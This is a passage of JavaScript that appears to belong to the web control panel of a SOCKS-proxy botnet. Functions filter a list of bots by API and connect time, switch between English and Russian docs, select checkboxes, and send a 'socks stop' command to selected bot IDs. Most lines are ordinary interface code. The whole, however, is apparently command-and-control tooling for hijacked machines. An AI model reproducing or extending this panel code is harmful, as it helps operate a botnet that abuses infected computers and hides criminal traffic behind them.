	onApplyFilter();
}

function filterByApi(api)
{
	//api = "170916";
	requestFilter ('bots', {"botid": "", "api": api, "time_connect": ""});
	requestContent('bots', {"api": api, "time_connect": ""}, setBotInfoHandlers);
	core_context.content = 'bots';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	setActiveMenuItem('menu', 'menu-bots');
	hideCommandPanel();
}

// textareas
function makeLarge(elem)
{
	elem.style.height = "100px";
}

// textareas
function makeSmall(elem)
{
	elem.style.height = "30px";
}

function show_docs(lang)
{
	if(lang == 'eng')
	{
		$('#deng').show();
		$('#drus').hide();
	}else{
		$('#deng').hide();
		$('#drus').show();
	}
}


$(document).on('click', '#check-all', function(){

		var socksCheckboxes = document.querySelectorAll('input[id^="check-"]');
		var checked = $(this)[0].checked;
		for (var i = 0; i < socksCheckboxes.length; i++){
			socksCheckboxes[i].checked = checked;
		}
	});


$(document).on('click', '#stop-selected-bots', function(){
	var socksCheckboxes = document.querySelectorAll('input[id^="check-socks-"]:checked');
	var botids = '';
	for (var i = 0; i < socksCheckboxes.length; i++) {
		
		var id = socksCheckboxes[i].id;

		botids += id.substr(12);
		if (i != socksCheckboxes.length-1){
			botids += ",";
		}
	}

	sendCommand(botids, "socks", "stop", onCommandDone);
});
